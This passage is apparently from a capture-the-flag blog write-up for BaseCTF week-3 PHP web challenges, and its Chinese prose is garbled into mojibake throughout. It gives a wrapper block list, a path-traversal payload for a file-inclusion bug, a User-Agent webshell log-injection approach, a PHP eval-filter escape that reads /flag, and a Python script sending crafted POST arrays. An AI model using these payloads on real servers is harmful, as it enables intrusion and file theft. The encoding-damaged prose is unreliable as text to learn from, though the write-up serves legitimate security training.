class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//è‹¥æ²¡æœ‰åˆ™æš‚åœå¾ªç¯</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®ä»£ç 2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$invalid_patterns</span> = [<span class="string">&#x27;php://&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;https://&#x27;</span>, <span class="string">&#x27;ftp://&#x27;</span>, <span class="string">&#x27;file://&#x27;</span> , <span class="string">&#x27;data://&#x27;</span>, <span class="string">&#x27;gopher://&#x27;</span>];</span><br><span class="line"><span class="comment">//é»‘åå•</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$invalid_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$Datch</span>, <span class="variable">$pattern</span>) !== <span class="literal">false</span>) &#123;<span class="comment">//æ£€æŸ¥$Datchä¸­æ˜¯å¦å­˜åœ¨é»‘æ˜å•ä¸­çš„é”®å€¼</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;æ­¤è·¯ä¸é€šæ¢æ¡è·¯è¯•è¯•?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆè®°å½•æˆ‘çš„æ€è·¯ï¼Œæ„Ÿè§‰åƒä¸ªéé¢„æœŸè§£ï¼ˆï¼‰</p><p>ç”±äºå­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå¹¶ä¸”è¦æ±‚æˆ‘ä»¬ä½¿ç”¨$required_charsä¸­çš„æ‰€æœ‰å­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ ä¸€æ¡åŒ…å«å…¶ä¸­æ‰€æœ‰å­—ç¬¦çš„è·¯å¾„æ¥è®¿é—®flag</p><p>æœ¬åœ°å¼€ä¸€ä¸ªdockeræ¨¡æ‹Ÿ</p><p>æ¯ä¸ªå­—ç¬¦å¯¹åº”çš„ç›®å½•</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sï¼šsys </span><br><span class="line"></span><br><span class="line">eï¼šetc</span><br><span class="line"></span><br><span class="line">v <span class="selector-tag">a</span> <span class="attribute">r</span> ï¼š  <span class="selector-tag">var</span></span><br><span class="line"></span><br><span class="line">nï¼šmnt</span><br><span class="line"></span><br><span class="line"> <span class="attribute">x</span> ï¼šsys/bus/cxl</span><br><span class="line"></span><br><span class="line">o ï¼šboot</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incompetent=HelloWorld&amp;Datch=..<span class="regexp">/../</span>..<span class="regexp">/sys/</span>bus<span class="regexp">/cxl/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc<span class="regexp">/../</span><span class="keyword">var</span><span class="regexp">/../</span>mnt<span class="regexp">/../</span>boot<span class="regexp">/../</span>flag</span><br></pre></td></tr></table></figure><p><img src="/2024/09/11/BaseCTF-week3/image-20240908165811164-17260327135689.png" alt="image-20240908165811164"></p><p>æ¥ä¸‹æ¥æ˜¯é¢„æœŸæ€è·¯ï¼Œç”±äºæ–‡ä»¶åŒ…å«æ¼æ´ä¸­å¯¹è¿‡æ»¤å™¨åšäº†ä¸¥æ ¼çš„é™åˆ¶ï¼Œä½†æ˜¯å¯¹è·¯å¾„æ²¡æœ‰é™åˆ¶ï¼Œæ‰€ä»¥è€ƒè™‘æ—¥å¿—æ³¨å…¥</p><p>å¯¹äºApacheï¼Œæ—¥å¿—å­˜æ”¾è·¯å¾„ï¼š&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p><p>å¯¹äºNgnixï¼Œæ—¥å¿—å­˜æ”¾è·¯å¾„ï¼š&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log å’Œ &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p><p><img src="/2024/09/11/BaseCTF-week3/image-20240908170549492-172603271356811.png" alt="image-20240908170549492"></p><p>Wappalyzeçœ‹ä¸€ä¸‹ä¸­é—´ä»¶æ˜¯Nginx,postä¼ å…¥å‚æ•°</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incompetent=HelloWorld&amp;Datch=<span class="regexp">/var/</span><span class="built_in">log</span>/nginx/access.<span class="built_in">log</span></span><br></pre></td></tr></table></figure><p>åœ¨U-Aå¤„å†™å…¥ä¸€å¥è¯æœ¨é©¬</p><p><img src="/2024/09/11/BaseCTF-week3/image-20240908175642696-172603271356810.png" alt="image-20240908175642696"></p><p>ä¸æ‡‚ä¸ºä»€ä¹ˆåœ¨U-Aå¤„å†™é©¬çš„aå‚æ•°ä¸ç”¨â€™â€™åŒ…èµ·æ¥ï¼Œå€Ÿç”¨bpè·‘ä¸å‡ºæ¥ï¼Œä½†æ˜¯åˆ©ç”¨hackbarå¯ä»¥ï¼Œè¿™æ˜¯ä»€ä¹ˆåŸå› </p><h3 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h3><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;hint.html&quot;</span>);</span><br><span class="line"><span class="variable">$Jail</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Jail_by.Happy&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$Jail</span> == <span class="literal">null</span>) <span class="keyword">die</span>(<span class="string">&quot;Do You Like My Jail?&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Like_Jail</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(`|\$|a|c|s|require|include)/i&#x27;</span>, <span class="variable">$var</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">Like_Jail</span>(<span class="variable">$Jail</span>)) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$Jail</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Yes! you escaped from the jail! LOL!&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You will Jail in your life!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åœ¨HTMLè§£æåå†è¾“å‡ºPHPæºä»£ç </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…³é”®ä»£ç åˆ†æ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Jail</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Jail_by.Happy&#x27;</span>];</span><br></pre></td></tr></table></figure><p>å½“ php ç‰ˆæœ¬â¼©äº 8 æ—¶ï¼ŒGET è¯·æ±‚çš„å‚æ•°åå«æœ‰ . ï¼Œä¼šè¢«è½¬ä¸º _ ï¼Œä½†æ˜¯å¦‚æœå‚æ•°åä¸­æœ‰ [ ï¼Œè¿™</p><p>ä¸ª [ ä¼šè¢«ç›´æ¥è½¬ä¸º _ ï¼Œä½†æ˜¯åâ¾¯å¦‚æœæœ‰ . ï¼Œè¿™ä¸ª . å°±ä¸ä¼šè¢«è½¬ä¸º _ ã€‚æ‰€ä»¥è¦å®Œæˆè¿™ä¸ªä¼ å‚ï¼Œå¿…é¡»æŠŠå‚æ•°åæ„é€ æˆè¿™æ ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?Jail[by.Happy=xxxxxx```</span><br></pre></td></tr></table></figure><p>é¡µé¢å‰ç«¯ä¸­åŒ…å«ä¸€ä¸ªphpinfoé¡µé¢ï¼Œæç¤ºç¦ç”¨å¾ˆå¤šå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œä¸è€ƒè™‘å‘½ä»¤æ‰§è¡Œ</p><p><img src="/2024/09/11/BaseCTF-week3/image-20240908193351917-172603271356812.png" alt="image-20240908193351917"></p><p>å¯ç”¨print_r(glob(â€˜&#x2F;*â€™))ä»¥æ•°ç»„å½¢å¼è¿”å›æ ¹ç›®å½•çš„æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url?Jail[by.Happy=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&#x27;/*&#x27;</span>));</span><br><span class="line"><span class="comment">//glob()ç”¨äºæŸ¥æ‰¾æ–‡ä»¶ï¼Œå›è¿”å›ä¸€ä¸ªæ–‡ä»¶æ•°ç»„;</span></span><br><span class="line"><span class="comment">//&#x27;/*&#x27;ä»£è¡¨æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹;</span></span><br><span class="line"><span class="comment">//ç”¨print_r()æ¥è¾“å‡ºæ”¹æ•°ç»„ï¼Œ</span></span><br></pre></td></tr></table></figure><p><img src="/2024/09/11/BaseCTF-week3/image-20240908194258997-172603271356813.png" alt="image-20240908194258997"></p><p>è¾“å‡ºæ‰€æœ‰æ ¹ç›®å½•ä¸‹ä»¥flå¼€å¤´çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?Jail[<span class="keyword">by</span>.Happy=print_r(<span class="keyword">glob</span>(&#x27;/<span class="keyword">fl</span>*&#x27;));</span><br></pre></td></tr></table></figure><p><img src="/2024/09/11/BaseCTF-week3/image-20240908194814407-172603271356814.png" alt="image-20240908194814407"></p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨highlight_file()å‡½æ•°æ¥è¯»å–æ–‡ä»¶æºç </p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?Jail[by.Happy=highlight_file(glob(<span class="string">&#x27;/f*&#x27;</span>)[0]);</span><br><span class="line">//glob(<span class="string">&#x27;/f*&#x27;</span>)[0]æŒ‡åŒ¹é…åˆ°çš„æ–‡ä»¶æ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼ï¼Œå³/flag</span><br></pre></td></tr></table></figure><p><img src="/2024/09/11/BaseCTF-week3/image-20240908195057756-172603271356815.png" alt="image-20240908195057756"></p><h3 id="ç©åŸç¥ç©çš„"><a href="#ç©åŸç¥ç©çš„" class="headerlink" title="ç©åŸç¥ç©çš„"></a>ç©åŸç¥ç©çš„</h3><p>è¿™ä¸ªé¢˜ç›®å¯ä»¥å­¦åˆ°å¾ˆå¤šä¸œè¥¿ï¼Œå¥½å¥½è®°å½•ä¸€ä¸‹</p><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;len&#x27;</span>]) == <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>)) &#123;</span><br><span class="line">  <span class="title function_ invoke__">ys_open</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tip&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;é”™äº†ï¼å°±ä½ è¿˜æƒ³ç©åŸç¥ï¼ŸâŒâŒâŒ&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ys_open</span>(<span class="params"><span class="variable">$tip</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$tip</span> != <span class="string">&quot;æˆ‘è¦ç©åŸç¥&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;æˆ‘ä¸ç®¡ï¼Œæˆ‘è¦ç©åŸç¥ï¼ğŸ˜­ğŸ˜­ğŸ˜­&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_ invoke__">dumpFlag</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dumpFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>]) || <span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>]) != <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å¯æ¶çš„QQäººï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>][<span class="number">0</span>];</span><br><span class="line">  <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>][<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>) || <span class="variable">$a</span> != <span class="string">&quot;100%&quot;</span> || <span class="variable">$b</span> != <span class="string">&quot;love100%&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;æŸç«™å´©äº†ï¼Ÿè‚¯å®šæ˜¯æŸå¿½æ‚ å¹²çš„ï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">  <span class="variable">$flag</span>[] = <span class="keyword">array</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$ii</span> = <span class="number">0</span>;<span class="variable">$ii</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>);<span class="variable">$ii</span>++) &#123;</span><br><span class="line">    <span class="variable">$flag</span>[<span class="variable">$ii</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$array</span>[<span class="variable">$ii</span>]) ^ <span class="variable">$ii</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$flag</span>);</span><br><span class="line">&#125; é”™äº†ï¼å°±ä½ è¿˜æƒ³ç©åŸç¥ï¼ŸâŒâŒâŒ</span><br></pre></td></tr></table></figure><p>æºç åˆ†æï¼š</p><p>1ã€ç»•è¿‡â€œé”™äº†ï¼å°±ä½ è¿˜æƒ³ç©åŸç¥ï¼ŸâŒâŒâŒâ€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;len&#x27;</span>]) == <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>)) &#123;</span><br><span class="line">  <span class="title function_ invoke__">ys_open</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tip&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;é”™äº†ï¼å°±ä½ è¿˜æƒ³ç©åŸç¥ï¼ŸâŒâŒâŒ&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦æ»¡è¶³ä¸€ä¸ªè¦æ±‚ï¼Œä¸€ä¸ªæ˜¯é€šè¿‡POSTæäº¤çš„lenæ•°ç»„é•¿åº¦éœ€è¦è·ŸåŒ…å«æ–‡ä»¶ä¸­flag.phpçš„æ•°ç»„$arrayç›¸åŒï¼Œå¯ä»¥é€šè¿‡pythonçˆ†ç ´å®ç°</p><p>2ã€ç»•è¿‡â€œæˆ‘ä¸ç®¡ï¼Œæˆ‘è¦ç©åŸç¥ï¼ğŸ˜­ğŸ˜­ğŸ˜­â€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ys_open</span>(<span class="params"><span class="variable">$tip</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$tip</span> != <span class="string">&quot;æˆ‘è¦ç©åŸç¥&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;æˆ‘ä¸ç®¡ï¼Œæˆ‘è¦ç©åŸç¥ï¼ğŸ˜­ğŸ˜­ğŸ˜­&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_ invoke__">dumpFlag</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šä¸€ä¸ªlenæ•°ç»„æ»¡è¶³è¦æ±‚åï¼Œä¼šè¿›å…¥ys_open()ï¼Œåœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢æˆ‘ä»¬éœ€è¦å¯¹tipè¿›è¡Œä¼ å‚ï¼Œå¹¶ä¸”ä¼ è¾“çš„æ˜¯ä¸­æ–‡å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡pythonå®ç°</p><p>3ã€ç»•è¿‡â€œå¯æ¶çš„QQäººï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡â€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>]) || <span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>]) != <span class="number">2</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;å¯æ¶çš„QQäººï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›å…¥dumpFlag()åï¼Œæˆ‘ä»¬éœ€è¦POSTä¼ å‚ä¼ å…¥mæ•°ç»„ï¼Œå¹¶ä¸”æ•°ç»„ä¸ªæ•°ä¸ºä¸¤ä¸ª</p><p>4ã€ç»•è¿‡â€æŸç«™å´©äº†ï¼Ÿè‚¯å®šæ˜¯æŸå¿½æ‚ å¹²çš„ï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡â€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>) || <span class="variable">$a</span> != <span class="string">&quot;100%&quot;</span> || <span class="variable">$b</span> != <span class="string">&quot;love100%&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;æŸç«™å´©äº†ï¼Ÿè‚¯å®šæ˜¯æŸå¿½æ‚ å¹²çš„ï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦æ±‚ä¼ å…¥çš„mæ•°ç»„ç¬¬ä¸€ä¸ªå¿…é¡»æ˜¯â€100%â€ï¼Œç¬¬äºŒä¸ªå¿…é¡»æ˜¯â€love100%â€æ‹¼æ¥md5åŠ å¯†åçš„100%</p><p>ç»™å‡ºç›¸åº”çš„è„šæœ¬æäº¤æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.basectf.fun:22350/&quot;</span></span><br><span class="line">post_data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†ç ´$arrayæ•°ç»„é•¿åº¦</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    post_data += <span class="string">f&quot;len[]=<span class="subst">&#123;i&#125;</span>&amp;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ»¡è¶³ys_openå‡½æ•°è¦æ±‚</span></span><br><span class="line">challenge_url = url + <span class="string">&quot;?tip=æˆ‘è¦ç©åŸç¥&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ»¡è¶³æ¡ä»¶$aå’Œ$b</span></span><br><span class="line">post_data += <span class="string">&quot;m[]=100%25&amp;m[]=love100%2530bd7ce7de206924302499f197c7a966&quot;</span></span><br><span class="line"><span class="built_in">print</span>(post_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.post(url=challenge_url,data=post_data,headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼š</p><p>1)è¿™é‡Œé€šè¿‡POSTæäº¤çš„æ•°ç»„å¿…é¡»åœ¨headersåŠ ä¸Š{â€˜Content-Typeâ€™: â€˜application&#x2F;x-www-form-urlencodedâ€™}å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å‘Šè¯‰æœåŠ¡å™¨æäº¤çš„æ•°æ®éœ€è¦ä»¥è¡¨å•æ•°æ®æ ¼å¼æ¥è§£æï¼Œç¡®ä¿æ•°æ®ä¸­çš„len[]&#x3D;1&amp;len[]&#x3D;2ç­‰å­—ç¬¦ä¸²èƒ½å¤Ÿè¢«æ­£ç¡®è§£æä¸ºphpè¯­è¨€ä¸­çš„æ•°ç»„ã€‚</p><p>2)POSTæäº¤çš„100%ä¸­å«æœ‰ç‰¹æ®Šå­—ç¬¦%ï¼Œå¿…é¡»å¯¹å…¶è¿›è¡Œurlç¼–ç ï¼Œè¿™æ ·æ‰èƒ½ä¿è¯æœåŠ¡å™¨èƒ½æ­£ç¡®è¯†åˆ«%</p><p>5ã€è¿˜åŸflag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span>[] = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$ii</span> = <span class="number">0</span>;<span class="variable">$ii</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>);<span class="variable">$ii</span>++) &#123;</span><br><span class="line">  <span class="variable">$flag</span>[<span class="variable">$ii</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$array</span>[<span class="variable">$ii</span>]) ^ <span class="variable">$ii</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨å°†flagçš„æ¯ä¸€ä¸ªå­—ç¬¦è·Ÿå…¶å¯¹åº”çš„æ•°ç»„ç´¢å¼•å€¼è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œæˆ‘ä»¬éœ€è¦åšçš„æ˜¯å°†å…¶è¿˜åŸæˆflagï¼Œä¸»è¦æ€è·¯å°±æ˜¯é€šè¿‡æšä¸¾asciiå­—ç¬¦ä¸å…¶ç´¢å¼•å€¼çš„å¼‚æˆ–è¿ç®—ç»“æœï¼Œå¦‚æœç»“æœç›¸åŒåˆ™å¯ä»¥ç¡®å®šflagå­—ç¬¦å¯¹åº”çš„asciiå€¼ï¼Œç„¶åå°†å…¶è¿˜åŸæˆflagå­—ç¬¦ä¸²ï¼Œä¸‹é¢æ˜¯æœåŠ¡å™¨ç»™å‡ºçš„jsonæ•°æ®</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="string">&quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;</span><span class="punctuation">,</span><span class="string">&quot;26657d5ff9020d2abefe558796b99584&quot;</span><span class="punctuation">,</span><span class="string">&quot;73278a4a86960eeb576a8fd4c9ec6997&quot;</span><span class="punctuation">,</span><span class="string">&quot;ec8956637a99787bd197eacd77acce5e&quot;</span><span class="punctuation">,</span><span 